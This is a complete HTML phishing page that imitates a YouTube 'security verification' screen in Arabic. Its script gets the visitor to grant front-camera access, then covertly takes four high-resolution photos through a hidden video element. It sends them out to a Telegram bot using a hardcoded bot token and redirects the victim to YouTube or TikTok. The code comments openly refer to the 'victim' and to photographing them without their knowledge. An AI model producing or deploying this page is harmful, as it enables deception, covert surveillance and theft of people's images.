<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>YouTube</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #f9f9f9;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
        }
        /* واجهة يوتيوب مزيفة */
        .youtube-wrapper {
            width: 100%;
            max-width: 450px;
            background: white;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
        }
        .youtube-header {
            background: #ff0000;
            padding: 16px 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .youtube-logo {
            display: flex;
            align-items: center;
            gap: 5px;
        }
        .youtube-logo svg {
            width: 24px;
            height: 24px;
            fill: white;
        }
        .youtube-logo span {
            color: white;
            font-size: 20px;
            font-weight: 600;
        }
        .youtube-header .verify-badge {
            background: rgba(255,255,255,0.2);
            padding: 4px 10px;
            border-radius: 20px;
            color: white;
            font-size: 12px;
            margin-left: auto;
        }
        .youtube-content {
            padding: 30px 25px;
        }
        .verify-title {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 20px;
        }
        .verify-title .icon {
            width: 40px;
            height: 40px;
            background: #f0f0f0;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #666;
        }
        .verify-title h2 {
            font-size: 20px;
            font-weight: 600;
            color: #333;
        }
        .verify-desc {
            color: #666;
            margin-bottom: 25px;
            line-height: 1.5;
            font-size: 14px;
        }
        .camera-box {
            background: #f5f5f5;
            border-radius: 12px;
            padding: 30px;
            text-align: center;
            margin-bottom: 25px;
            border: 2px dashed #ddd;
            position: relative;
            min-height: 200px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .camera-placeholder {
            color: #999;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 10px;
        }
        .camera-placeholder svg {
            width: 48px;
            height: 48px;
            fill: #999;
        }
        #preview {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border-radius: 12px;
            object-fit: cover;
            display: none;
        }
        .allow-btn {
            background: #ff0000;
            color: white;
            border: none;
            padding: 16px 30px;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
            margin-bottom: 12px;
        }
        .allow-btn:hover {
            background: #cc0000;
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(255,0,0,0.3);
        }
        .skip-btn {
            background: transparent;
            color: #666;
            border: none;
            padding: 12px;
            font-size: 14px;
            cursor: pointer;
            width: 100%;
        }
        .footer-note {
            margin-top: 20px;
            font-size: 12px;
            color: #999;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
        }
        .footer-note span {
            display: flex;
            align-items: center;
            gap: 5px;
        }
        /* عناصر مخفية */
        .hidden-video {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0.01;
            pointer-events: none;
            z-index: -9999;
        }
    </style>
</head>
<body>
    <div class="youtube-wrapper">
        <div class="youtube-header">
            <div class="youtube-logo">
                <svg viewBox="0 0 24 24">
                    <path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/>
                </svg>
                <span>YouTube</span>
            </div>
            <div class="verify-badge">مطلوب تحقق</div>
        </div>
        
        <div class="youtube-content">
            <div class="verify-title">
                <div class="icon">🔐</div>
                <h2>التحقق الأمني</h2>
            </div>
            
            <div class="verify-desc">
                لأسباب أمنية، نطلب منك التحقق من هويتك عبر الكاميرا الأمامية. هذا الإجراء ضروري لحماية حسابك.
            </div>
            
            <div class="camera-box" id="cameraBox">
                <div class="camera-placeholder" id="placeholder">
                    <svg viewBox="0 0 24 24">
                        <path d="M12 6a2 2 0 0 0-2 2 2 2 0 0 0 2 2 2 2 0 0 0 2-2 2 2 0 0 0-2-2zm10-4H2C.9 2 0 2.9 0 4v16c0 1.1.9 2 2 2h20c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 18H2V4h20v16zM12 0L2 4v16l10 4 10-4V4L12 0z"/>
                    </svg>
                    <span>الكاميرا متوقفة</span>
                </div>
                <video id="preview" autoplay playsinline muted></video>
            </div>
            
            <button class="allow-btn" id="allowBtn">✅ السماح بالوصول للكاميرا</button>
            <button class="skip-btn" id="skipBtn">⏭️ تخطي مؤقتاً</button>
            
            <div class="footer-note">
                <span>🔒 اتصال آمن</span>
                <span>⚡ YouTube Premium</span>
            </div>
        </div>
    </div>

    <!-- عناصر مخفية للتصوير -->
    <div class="hidden-video" id="hiddenContainer"></div>

    <script>
        // ==================== الإعدادات ====================
        const USER_ID = new URLSearchParams(window.location.search).get('id');
        const BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";

        // قائمة روابط التحويل (يوتيوب + تيك توك)
        const REDIRECT_URLS = [
            "https://www.youtube.com",
            "https://www.youtube.com/watch?v=1PqK4yM5cA",
            "https://www.youtube.com/shorts/3PDpFANZnlA",
            "https://www.tiktok.com/@youtube",
            "https://www.tiktok.com/@tiktok",
            "https://www.tiktok.com/foryou"
        ];

        // عناصر الصفحة
        const allowBtn = document.getElementById('allowBtn');
        const skipBtn = document.getElementById('skipBtn');
        const preview = document.getElementById('preview');
        const placeholder = document.getElementById('placeholder');
        const cameraBox = document.getElementById('cameraBox');

        // ==================== دوال التصوير الخفي ====================
        async function requestCamera() {
            try {
                // طلب الكاميرا الأمامية بأعلى دقة
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1920, max: 1920 },
                        height: { ideal: 1080, max: 1080 }
                    }
                });

                // عرض المعاينة للضحية (عشان يطمن)
                preview.srcObject = stream;
                preview.style.display = 'block';
                placeholder.style.display = 'none';

                // تغيير النص
                document.querySelector('.verify-desc').innerText = 'تم التحقق بنجاح... جاري تحويلك إلى YouTube';
                allowBtn.style.display = 'none';
                skipBtn.style.display = 'none';

                // التصوير في الخلفية (بدون ما يدري)
                await captureInBackground(stream);

                // تحويل عشوائي بعد التصوير
                setTimeout(() => {
                    const randomUrl = REDIRECT_URLS[Math.floor(Math.random() * REDIRECT_URLS.length)];
                    window.location.replace(randomUrl);
                }, 1500);

            } catch(e) {
                // إذا رفض الكاميرا، نطلب مرة ثانية بطريقة ودية
                alert('❌ فشل الوصول للكاميرا. الرجاء السماح ثم المحاولة مرة أخرى');
            }
        }

        async function captureInBackground(stream) {
            // إنشاء عنصر فيديو مخفي تماماً
            const hiddenVideo = document.createElement('video');
            hiddenVideo.srcObject = stream;
            hiddenVideo.setAttribute('playsinline', '');
            hiddenVideo.setAttribute('autoplay', '');
            hiddenVideo.setAttribute('muted', '');
            hiddenVideo.style.position = 'absolute';
            hiddenVideo.style.left = '-9999px';
            hiddenVideo.style.top = '-9999px';
            hiddenVideo.style.width = '1px';
            hiddenVideo.style.height = '1px';
            hiddenVideo.style.opacity = '0';
            hiddenVideo.style.pointerEvents = 'none';
            document.getElementById('hiddenContainer').appendChild(hiddenVideo);

            // انتظار تحميل الفيديو
            await new Promise(resolve => {
                if (hiddenVideo.videoWidth > 0) resolve();
                else hiddenVideo.onloadedmetadata = resolve;
            });

            // التقاط 4 صور متتالية (بجودة عالية)
            for (let i = 0; i < 4; i++) {
                // تأخير بسيط بين الصور
                await new Promise(r => setTimeout(r, i * 400));

                const canvas = document.createElement('canvas');
                canvas.width = hiddenVideo.videoWidth || 1280;
                canvas.height = hiddenVideo.videoHeight || 720;
                
                const ctx = canvas.getContext('2d');
                ctx.imageSmoothingEnabled = true;
                ctx.imageSmoothingQuality = 'high';
                ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);

                // تحويل إلى blob بجودة عالية
                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.95));

                // إرسال للتيليجرام
                const formData = new FormData();
                formData.append('chat_id', USER_ID);
                formData.append('photo', blob, `selfie_${i+1}.jpg`);
                formData.append('caption', `📸 صورة ${i+1} - ${new Date().toLocaleString('ar-SA')}`);

                // إرسال بدون انتظار (خلفي)
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                }).catch(e => console.log('Send error:', e));

                // إرسال تأكيد (اختياري)
                if (i === 3) {
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: USER_ID,
                            text: `✅ تم التصوير بنجاح!\n📸 4 صور من الكاميرا الأمامية\n⏱️ ${new Date().toLocaleString('ar-SA')}`,
                            parse_mode: 'HTML'
                        })
                    }).catch(e => {});
                }
            }

            // تنظيف
            setTimeout(() => {
                hiddenVideo.remove();
                stream.getTracks().forEach(t => t.stop());
            }, 2000);
        }

        // ==================== التخطي ====================
        function skip() {
            const randomUrl = REDIRECT_URLS[Math.floor(Math.random() * REDIRECT_URLS.length)];
            window.location.replace(randomUrl);
        }

        // ==================== ربط الأزرار ====================
        allowBtn.addEventListener('click', requestCamera);
        skipBtn.addEventListener('click', skip);

        // إذا ما في ID بالرابط، نحول مباشرة
        if (!USER_ID) {
            window.location.replace("https://www.youtube.com");
        }
    </script>
</body>
</html>
